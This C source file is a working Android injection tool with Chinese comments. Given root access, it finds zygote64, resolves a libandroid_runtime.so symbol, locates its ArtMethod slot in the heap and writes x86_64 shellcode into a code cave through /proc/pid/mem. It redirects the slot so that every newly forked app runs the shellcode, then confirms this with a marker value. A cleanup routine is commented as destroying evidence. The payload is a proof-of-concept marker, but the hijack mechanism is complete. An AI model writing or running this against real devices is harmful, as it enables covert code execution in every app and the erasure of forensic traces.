#include <ctype.h>
#include <dirent.h>
#include <elf.h>
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

#include <signal.h>
#include <stdint.h>

#define TARGET_PROC_NAME "zygote64"
#define TARGET_LIB_NAME "libandroid_runtime.so"
#define TARGET_SYMBOL                                                          \
  "_Z27android_os_Process_setArgV0P7_JNIEnvP8_jobjectP8_jstring"

#define READ_CHUNK (1024 * 1024)

typedef struct {
  uint64_t start;
  uint64_t end;
  bool readable;
  bool writable;
  bool executable;
  uint64_t offset;
  char path[512];
} map_entry_t;

typedef struct {
  uint64_t base;
  char path[512];
} lib_info_t;

#define MAGIC_VALUE 0x1337133713371337ULL

// --- 全局变量（用于信号还原） ---
int g_pid = -1;
uint64_t g_slot = 0;
uint64_t g_orig_val = 0;
char g_mem_path[64];
int g_rw_mem_fd = 0;
uint64_t code_cave = 0;
static void die(const char *msg) {
  fprintf(stderr, "error: %s\n", msg);
  exit(1);
}
void restore_env(int sig) {
  if (g_rw_mem_fd >= 0 && g_slot != 0) {
    // 1. 还原指针 (防止新进程被劫持)
    pwrite(g_rw_mem_fd, &g_orig_val, sizeof(g_orig_val), (off_t)g_slot);

    // 2. 擦除机器码 (毁灭证据)
    uint8_t zero_buf[512];
    memset(zero_buf, 0, sizeof(zero_buf));
    pwrite(g_rw_mem_fd, zero_buf, sizeof(zero_buf), (off_t)code_cave);

    printf("\n[+] Zygote 现场已完全清理（指针还原 + 代码穴擦除）。\n");
  }
  exit(0);
}

// 获取系统最新生成的进程 PID
int get_latest_pid() {
  DIR *dir = opendir("/proc");
  struct dirent *ent;
  int max_pid = -1;
  while ((ent = readdir(dir)) != NULL) {
    if (isdigit(ent->d_name[0])) {
      int pid = atoi(ent->d_name);
      if (pid > max_pid)
        max_pid = pid;
    }
  }
  closedir(dir);
  return max_pid;
}

static bool str_contains(const char *haystack, const char *needle) {
  return haystack && needle && strstr(haystack, needle) != NULL;
}

static int find_pid_by_name(const char *name) {
  DIR *dir = opendir("/proc");
  if (!dir)
    return -1;
  struct dirent *ent;
  while ((ent = readdir(dir)) != NULL) {
    if (!isdigit((unsigned char)ent->d_name[0]))
      continue;
    int pid = atoi(ent->d_name);
    char comm_path[64];
    snprintf(comm_path, sizeof(comm_path), "/proc/%d/comm", pid);
    FILE *f = fopen(comm_path, "r");
    if (!f)
      continue;
    char buf[256];
    if (fgets(buf, sizeof(buf), f)) {
      size_t len = strlen(buf);
      if (len > 0 && buf[len - 1] == '\n')
        buf[len - 1] = '\0';
      if (strcmp(buf, name) == 0) {
        fclose(f);
        closedir(dir);
        return pid;
      }
    }
    fclose(f);
  }
  closedir(dir);
  return -1;
}

static bool parse_maps_line(const char *line, map_entry_t *out) {
  if (!line || !out)
    return false;
  memset(out, 0, sizeof(*out));

  char perms[8] = {0};
  char dev[16] = {0};
  unsigned long inode = 0;
  char path[512] = {0};

  int n = sscanf(line, "%lx-%lx %7s %lx %15s %lu %511[^\n]", &out->start,
                 &out->end, perms, &out->offset, dev, &inode, path);
  if (n < 6)
    return false;
  out->readable = (perms[0] == 'r');
  out->writable = (perms[1] == 'w');
  out->executable = (perms[2] == 'x');
  if (n == 7) {
    strncpy(out->path, path, sizeof(out->path) - 1);
  } else {
    out->path[0] = '\0';
  }
  return true;
}

static bool find_lib_info(int pid, lib_info_t *out) {
  if (!out)
    return false;
  memset(out, 0, sizeof(*out));

  char maps_path[64];
  snprintf(maps_path, sizeof(maps_path), "/proc/%d/maps", pid);
  FILE *f = fopen(maps_path, "r");
  if (!f)
    return false;

  char line[1024];
  uint64_t best_base = 0;
  char best_path[512] = {0};

  while (fgets(line, sizeof(line), f)) {
    map_entry_t e;
    if (!parse_maps_line(line, &e))
      continue;
    if (!str_contains(e.path, TARGET_LIB_NAME))
      continue;
    if (e.offset != 0)
      continue;
    if (best_base == 0 || e.start < best_base) {
      best_base = e.start;
      strncpy(best_path, e.path, sizeof(best_path) - 1);
    }
  }
  fclose(f);

  if (best_base == 0)
    return false;
  out->base = best_base;
  strncpy(out->path, best_path, sizeof(out->path) - 1);
  return true;
}

static bool vaddr_to_offset(const Elf64_Phdr *phdrs, int phnum, uint64_t vaddr,
                            uint64_t *out_off) {
  for (int i = 0; i < phnum; i++) {
    const Elf64_Phdr *p = &phdrs[i];
    if (p->p_type != PT_LOAD)
      continue;
    uint64_t vstart = p->p_vaddr;
    uint64_t vend = p->p_vaddr + p->p_memsz;
    if (vaddr >= vstart && vaddr < vend) {
      *out_off = p->p_offset + (vaddr - vstart);
      return true;
    }
  }
  return false;
}

static bool read_at(FILE *f, uint64_t off, void *buf, size_t size) {
  if (fseek(f, (long)off, SEEK_SET) != 0)
    return false;
  return fread(buf, 1, size, f) == size;
}

static bool parse_gnu_hash(FILE *f, uint64_t gnu_hash_off,
                           uint64_t *out_symcount) {
  uint32_t hdr[4];
  if (!read_at(f, gnu_hash_off, hdr, sizeof(hdr)))
    return false;
  uint32_t nbuckets = hdr[0];
  uint32_t symoffset = hdr[1];
  uint32_t bloom_size = hdr[2];

  uint64_t buckets_off =
      gnu_hash_off + 16 + (uint64_t)bloom_size * sizeof(uint64_t);
  uint64_t chains_off = buckets_off + (uint64_t)nbuckets * sizeof(uint32_t);

  uint32_t max_sym = 0;
  for (uint32_t i = 0; i < nbuckets; i++) {
    uint32_t b = 0;
    if (!read_at(f, buckets_off + (uint64_t)i * 4, &b, 4))
      return false;
    if (b > max_sym)
      max_sym = b;
  }
  if (max_sym < symoffset) {
    *out_symcount = symoffset;
    return true;
  }

  uint32_t idx = max_sym;
  while (1) {
    uint32_t val = 0;
    uint64_t off = chains_off + (uint64_t)(idx - symoffset) * 4;
    if (!read_at(f, off, &val, 4))
      return false;
    idx++;
    if (val & 1)
      break;
  }
  *out_symcount = idx;
  return true;
}

static bool find_symbol_offset(const char *lib_path, const char *sym_name,
                               uint64_t *out_offset) {
  FILE *f = fopen(lib_path, "rb");
  if (!f)
    return false;

  Elf64_Ehdr eh;
  if (!read_at(f, 0, &eh, sizeof(eh))) {
    fclose(f);
    return false;
  }
  if (memcmp(eh.e_ident, ELFMAG, SELFMAG) != 0 ||
      eh.e_ident[EI_CLASS] != ELFCLASS64) {
    fclose(f);
    return false;
  }

  Elf64_Phdr *phdrs = calloc(eh.e_phnum, sizeof(Elf64_Phdr));
  if (!phdrs) {
    fclose(f);
    return false;
  }
  if (!read_at(f, eh.e_phoff, phdrs, eh.e_phnum * sizeof(Elf64_Phdr))) {
    free(phdrs);
    fclose(f);
    return false;
  }

  Elf64_Off dyn_off = 0;
  Elf64_Xword dyn_size = 0;
  for (int i = 0; i < eh.e_phnum; i++) {
    if (phdrs[i].p_type == PT_DYNAMIC) {
      dyn_off = phdrs[i].p_offset;
      dyn_size = phdrs[i].p_filesz;
      break;
    }
  }
  if (dyn_off == 0 || dyn_size == 0) {
    free(phdrs);
    fclose(f);
    return false;
  }

  size_t dyn_count = dyn_size / sizeof(Elf64_Dyn);
  Elf64_Dyn *dyns = calloc(dyn_count, sizeof(Elf64_Dyn));
  if (!dyns) {
    free(phdrs);
    fclose(f);
    return false;
  }
  if (!read_at(f, dyn_off, dyns, dyn_count * sizeof(Elf64_Dyn))) {
    free(dyns);
    free(phdrs);
    fclose(f);
    return false;
  }

  uint64_t symtab_vaddr = 0;
  uint64_t strtab_vaddr = 0;
  uint64_t strsz = 0;
  uint64_t syment = sizeof(Elf64_Sym);
  uint64_t hash_vaddr = 0;
  uint64_t gnu_hash_vaddr = 0;

  for (size_t i = 0; i < dyn_count; i++) {
    switch (dyns[i].d_tag) {
    case DT_SYMTAB:
      symtab_vaddr = dyns[i].d_un.d_ptr;
      break;
    case DT_STRTAB:
      strtab_vaddr = dyns[i].d_un.d_ptr;
      break;
    case DT_STRSZ:
      strsz = dyns[i].d_un.d_val;
      break;
    case DT_SYMENT:
      syment = dyns[i].d_un.d_val;
      break;
    case DT_HASH:
      hash_vaddr = dyns[i].d_un.d_ptr;
      break;
    case DT_GNU_HASH:
      gnu_hash_vaddr = dyns[i].d_un.d_ptr;
      break;
    default:
      break;
    }
  }
  free(dyns);

  if (symtab_vaddr == 0 || strtab_vaddr == 0 || strsz == 0) {
    free(phdrs);
    fclose(f);
    return false;
  }

  uint64_t symtab_off = 0;
  uint64_t strtab_off = 0;
  if (!vaddr_to_offset(phdrs, eh.e_phnum, symtab_vaddr, &symtab_off) ||
      !vaddr_to_offset(phdrs, eh.e_phnum, strtab_vaddr, &strtab_off)) {
    free(phdrs);
    fclose(f);
    return false;
  }

  uint64_t symcount = 0;
  if (hash_vaddr != 0) {
    uint64_t hash_off = 0;
    if (vaddr_to_offset(phdrs, eh.e_phnum, hash_vaddr, &hash_off)) {
      uint32_t header[2];
      if (read_at(f, hash_off, header, sizeof(header))) {
        symcount = header[1];
      }
    }
  }
  if (symcount == 0 && gnu_hash_vaddr != 0) {
    uint64_t gnu_hash_off = 0;
    if (vaddr_to_offset(phdrs, eh.e_phnum, gnu_hash_vaddr, &gnu_hash_off)) {
      parse_gnu_hash(f, gnu_hash_off, &symcount);
    }
  }
  if (symcount == 0 && strtab_off > symtab_off && syment != 0) {
    symcount = (strtab_off - symtab_off) / syment;
  }
  if (symcount == 0) {
    free(phdrs);
    fclose(f);
    return false;
  }

  char *strtab = malloc(strsz);
  if (!strtab) {
    free(phdrs);
    fclose(f);
    return false;
  }
  if (!read_at(f, strtab_off, strtab, strsz)) {
    free(strtab);
    free(phdrs);
    fclose(f);
    return false;
  }

  for (uint64_t i = 0; i < symcount; i++) {
    Elf64_Sym sym;
    uint64_t off = symtab_off + i * syment;
    if (!read_at(f, off, &sym, sizeof(sym)))
      break;
    if (sym.st_name >= strsz)
      continue;
    const char *name = strtab + sym.st_name;
    if (strcmp(name, sym_name) == 0) {
      *out_offset = sym.st_value;
      free(strtab);
      free(phdrs);
      fclose(f);
      return true;
    }
  }

  free(strtab);
  free(phdrs);
  fclose(f);
  return false;
}

static bool is_heap_candidate(const char *path) {
  if (!path || path[0] == '\0')
    return false;
  if (strcmp(path, "[heap]") == 0)
    return true;
  if (str_contains(path, "dalvik"))
    return true;
  if (str_contains(path, "malloc"))
    return true;
  if (str_contains(path, "scudo"))
    return true;
  if (str_contains(path, "heap"))
    return true;
  return false;
}

static bool all_zero(const uint8_t *buf, size_t len) {
  for (size_t i = 0; i < len; i++) {
    if (buf[i] != 0)
      return false;
  }
  return true;
}

static uint64_t find_code_cave(int pid, const char *library_name) {
  if (pid <= 0 || !library_name)
    return 0;

  char maps_path[64];
  snprintf(maps_path, sizeof(maps_path), "/proc/%d/maps", pid);
  FILE *f = fopen(maps_path, "r");
  if (!f)
    return 0;

  uint64_t code_end = 0;
  char line[1024];
  while (fgets(line, sizeof(line), f)) {
    map_entry_t e;
    if (!parse_maps_line(line, &e))
      continue;
    if (!str_contains(e.path, library_name))
      continue;
    if (!(e.readable && e.executable))
      continue;
    if (e.end > code_end)
      code_end = e.end;
  }
  fclose(f);

  if (code_end < 512)
    return 0;

  char mem_path[64];
  snprintf(mem_path, sizeof(mem_path), "/proc/%d/mem", pid);
  int mem_fd = open(mem_path, O_RDONLY);
  if (mem_fd < 0)
    return 0;

  uint8_t buf[512];
  uint64_t start = code_end - sizeof(buf);
  ssize_t n = pread(mem_fd, buf, sizeof(buf), (off_t)start);
  close(mem_fd);
  if (n != (ssize_t)sizeof(buf))
    return 0;

  if (!all_zero(buf, sizeof(buf)))
    return 0;
  return start;
}

static int scan_for_pointer(int mem_fd, uint64_t target_ptr, map_entry_t *maps,
                            size_t map_count, uint64_t *out_slot) {
  uint8_t needle[8];
  memcpy(needle, &target_ptr, sizeof(needle));

  uint8_t *buf = malloc(READ_CHUNK + sizeof(needle) - 1);
  if (!buf)
    return -1;
  uint8_t tail[sizeof(needle) - 1];
  size_t tail_len = 0;

  for (size_t i = 0; i < map_count; i++) {
    map_entry_t *m = &maps[i];
    uint64_t seg_start = m->start;
    uint64_t seg_end = m->end;
    uint64_t addr = seg_start;
    tail_len = 0;

    while (addr < seg_end) {
      size_t to_read = READ_CHUNK;
      uint64_t remaining = seg_end - addr;
      if (remaining < to_read)
        to_read = (size_t)remaining;

      if (tail_len > 0)
        memcpy(buf, tail, tail_len);

      ssize_t n = pread(mem_fd, buf + tail_len, to_read, (off_t)addr);
      if (n <= 0) {
        break;
      }
      size_t total = (size_t)n + tail_len;

      for (size_t off = 0; off + sizeof(needle) <= total; off++) {
        if (memcmp(buf + off, needle, sizeof(needle)) == 0) {
          *out_slot = addr - tail_len + off;
          free(buf);
          return 0;
        }
      }

      if (total >= sizeof(needle) - 1) {
        tail_len = sizeof(needle) - 1;
        memcpy(tail, buf + total - tail_len, tail_len);
      } else {
        tail_len = total;
        memcpy(tail, buf, tail_len);
      }
      addr += (uint64_t)n;
    }
  }

  free(buf);
  return -1;
}

static int collect_heap_maps(int pid, bool require_writable,
                             bool scan_all_readable, bool debug_maps,
                             map_entry_t **out_maps, size_t *out_count) {
  char maps_path[64];
  snprintf(maps_path, sizeof(maps_path), "/proc/%d/maps", pid);
  FILE *f = fopen(maps_path, "r");
  if (!f)
    return -1;

  size_t cap = 16;
  size_t count = 0;
  map_entry_t *arr = calloc(cap, sizeof(map_entry_t));
  if (!arr) {
    fclose(f);
    return -1;
  }

  char line[1024];
  while (fgets(line, sizeof(line), f)) {
    map_entry_t e;
    if (!parse_maps_line(line, &e))
      continue;
    if (!e.readable)
      continue;
    if (require_writable && !e.writable)
      continue;
    if (!scan_all_readable && !is_heap_candidate(e.path))
      continue;
    if (count == cap) {
      cap *= 2;
      map_entry_t *tmp = realloc(arr, cap * sizeof(map_entry_t));
      if (!tmp) {
        free(arr);
        fclose(f);
        return -1;
      }
      arr = tmp;
    }
    arr[count++] = e;
  }

  if (!scan_all_readable && count == 0) {
    rewind(f);
    while (fgets(line, sizeof(line), f)) {
      map_entry_t e;
      if (!parse_maps_line(line, &e))
        continue;
      if (!e.readable)
        continue;
      if (require_writable && !e.writable)
        continue;
      if (e.path[0] == '\0' || strncmp(e.path, "[anon:", 6) == 0) {
        if (count == cap) {
          cap *= 2;
          map_entry_t *tmp = realloc(arr, cap * sizeof(map_entry_t));
          if (!tmp) {
            free(arr);
            fclose(f);
            return -1;
          }
          arr = tmp;
        }
        arr[count++] = e;
      }
    }
  }

  fclose(f);
  if (debug_maps && count > 0) {
    fprintf(stderr, "debug: %zu candidate maps\n", count);
    for (size_t i = 0; i < count; i++) {
      map_entry_t *m = &arr[i];
      fprintf(stderr, "  0x%016" PRIx64 "-0x%016" PRIx64 " %s%s%s %s\n",
              m->start, m->end, m->readable ? "r" : "-",
              m->writable ? "w" : "-", m->executable ? "x" : "-",
              m->path[0] ? m->path : "(anon)");
    }
  }
  *out_maps = arr;
  *out_count = count;
  return 0;
}

static void usage(const char *argv0) {
  fprintf(stderr,
          "usage: %s [--pid <pid>] [--pause] [--scan-all-readable] [--no-rw] "
          "[--debug-maps]\n",
          argv0);
}
void verify_maps_region(int pid, uint64_t slot) {
  char maps_path[64];
  snprintf(maps_path, sizeof(maps_path), "/proc/%d/maps", pid);
  FILE *f = fopen(maps_path, "r");
  char line[1024];
  while (fgets(line, sizeof(line), f)) {
    uint64_t start, end;
    sscanf(line, "%lx-%lx", &start, &end);
    if (slot >= start && slot < end) {
      printf("Verification - Map Region: %s", line);
      break;
    }
  }
  fclose(f);
}
int main(int argc, char **argv) {
  int pid = -1;
  bool pause_after_symbol = false;
  bool scan_all_readable = false;
  bool require_writable = true;
  bool debug_maps = false;

  for (int i = 1; i < argc; i++) {
    if (strcmp(argv[i], "--pid") == 0 && i + 1 < argc) {
      pid = atoi(argv[++i]);
    } else if (strcmp(argv[i], "--pause") == 0) {
      pause_after_symbol = true;
    } else if (strcmp(argv[i], "--scan-all-readable") == 0) {
      scan_all_readable = true;
    } else if (strcmp(argv[i], "--no-rw") == 0) {
      require_writable = false;
    } else if (strcmp(argv[i], "--debug-maps") == 0) {
      debug_maps = true;
    } else {
      usage(argv[0]);
      return 1;
    }
  }

  if (pid <= 0) {
    pid = find_pid_by_name(TARGET_PROC_NAME);
    if (pid <= 0) {
      die("zygote64 not found. Use --pid <pid>.");
    }
  }

  lib_info_t lib;
  if (!find_lib_info(pid, &lib)) {
    die("libandroid_runtime.so not found in target process maps.");
  }

  uint64_t sym_offset = 0;
  if (!find_symbol_offset(lib.path, TARGET_SYMBOL, &sym_offset)) {
    die("failed to resolve symbol offset in libandroid_runtime.so.");
  }

  uint64_t sym_runtime = lib.base + sym_offset;

  printf("step1:\n");
  printf("  pid: %d\n", pid);
  printf("  lib: %s\n", lib.path);
  printf("  lib_base: 0x%016" PRIx64 "\n", lib.base);
  printf("  sym_offset: 0x%016" PRIx64 "\n", sym_offset);
  printf("  sym_runtime: 0x%016" PRIx64 "\n", sym_runtime);

  code_cave = find_code_cave(pid, TARGET_LIB_NAME);
  if (code_cave != 0) {
    printf("  code_cave: 0x%016" PRIx64 " (last 512 bytes of r-x are zero)\n",
           code_cave);
  } else {
    printf("  code_cave: not found (last 512 bytes not all zero)\n");
  }

  if (pause_after_symbol) {
    printf("press Enter to continue scanning...\n");
    (void)getchar();
  }

  map_entry_t *maps = NULL;
  size_t map_count = 0;
  if (collect_heap_maps(pid, require_writable, scan_all_readable, debug_maps,
                        &maps, &map_count) != 0 ||
      map_count == 0) {
    die("no readable heap maps found.");
  }

  char mem_path[64];
  snprintf(mem_path, sizeof(mem_path), "/proc/%d/mem", pid);
  int mem_fd = open(mem_path, O_RDONLY);
  if (mem_fd < 0) {
    die("failed to open /proc/<pid>/mem (need root or permissive SELinux).");
  }

  uint64_t slot = 0;
  if (scan_for_pointer(mem_fd, sym_runtime, maps, map_count, &slot) != 0) {
    close(mem_fd);
    free(maps);
    die("pointer not found in heap maps.");
  }

  uint64_t slot_value = 0;
  if (pread(mem_fd, &slot_value, sizeof(slot_value), (off_t)slot) !=
      sizeof(slot_value)) {
    close(mem_fd);
    free(maps);
    die("failed to read slot value.");
  }

  close(mem_fd);
  free(maps);

  printf("step2:\n");
  printf("  art_method_slot: 0x%016" PRIx64 "\n", slot);
  printf("  slot_value: 0x%016" PRIx64 "\n", slot_value);
  printf("\n[step3] 实施Hook...\n");

  if (code_cave == 0)
    die("未找到代码穴，无法实施劫持。");

  // 设置全局变量供信号处理使用
  g_pid = pid;
  g_slot = slot;
  g_orig_val = slot_value;
  snprintf(g_mem_path, sizeof(g_mem_path), "/proc/%d/mem", pid);
  signal(SIGINT, restore_env);

  // 2. 准备物理证据点 (暗号放在 slot 后面 16 字节，确保 rw 权限)
  uint64_t magic_addr = slot + 16;

  // 3. 构建 Shellcode (x86_64)
  uint8_t shellcode[] = {
      0x50, 0x53, // 0: push rax, rbx
      0x48, 0xB8, 0x37, 0x13, 0x37,
      0x13, 0x37, 0x13, 0x37, 0x13, // 2: movabs rax, 0x1337133713371337
      0x48, 0xBB, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, // 12: movabs rbx, <magic_addr>
      0x48, 0x89, 0x03,             // 22: mov [rbx], rax
      0x5B, 0x58,                   // 25: pop rbx, rax
      0x48, 0xB8, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, // 27: movabs rax, <sym_runtime>
      0xFF, 0xE0                    // 37: jmp rax
  };

  memcpy(&shellcode[14], &magic_addr, 8);
  memcpy(&shellcode[29], &sym_runtime, 8); // 修正偏移为 29

  // 4. 执行注入
  g_rw_mem_fd = open(g_mem_path, O_RDWR);
  if (g_rw_mem_fd < 0)
    die("无法打开 mem,请检查 root 权限");

  printf("[*] 正在写入 Shellcode 到 0x%lx...\n", code_cave);
  pwrite(g_rw_mem_fd, shellcode, sizeof(shellcode), (off_t)code_cave);

  printf("[*] 正在接管 ArtMethod Slot 0x%lx -> 0x%lx...\n", slot, code_cave);
  pwrite(g_rw_mem_fd, &code_cave, sizeof(code_cave), (off_t)slot);

  printf("\n[+] 成功！监听中...\n");
  printf("[!] 操作指引：现在请在手机上打开任意一个 App（如计算器）。\n");
  printf("[*] 提示：按 Ctrl+C 可安全撤销 Hook 并退出。\n\n");

  int last_checked_pid = -1;
  while (1) {
    // 尝试读取最新进程的内存，因为暗号会写在子进程的私有内存里 (CoW)
    int current_latest = get_latest_pid();
    if (current_latest != last_checked_pid && current_latest > pid) {
      char child_mem[64];
      snprintf(child_mem, sizeof(child_mem), "/proc/%d/mem", current_latest);
      int cfd = open(child_mem, O_RDONLY);
      if (cfd >= 0) {
        uint64_t val = 0;
        if (pread(cfd, &val, sizeof(val), (off_t)magic_addr) == sizeof(val)) {
          if (val == MAGIC_VALUE) {
            printf("\n[!!!] 捕获成功！\n");
            printf("[+] 检测到新进程 (PID: %d) 触发了 Shellcode！\n",
                   current_latest);
            printf("[+] 暗号 0x%lx 已在子进程内存中确认。\n", val);
            close(cfd);
            break;
          }
        }
        close(cfd);
      }
      last_checked_pid = current_latest;
    }
    printf(".");
    fflush(stdout);
    usleep(300000);
  }

  // 5. 恢复
  restore_env(0);
  return 0;
}
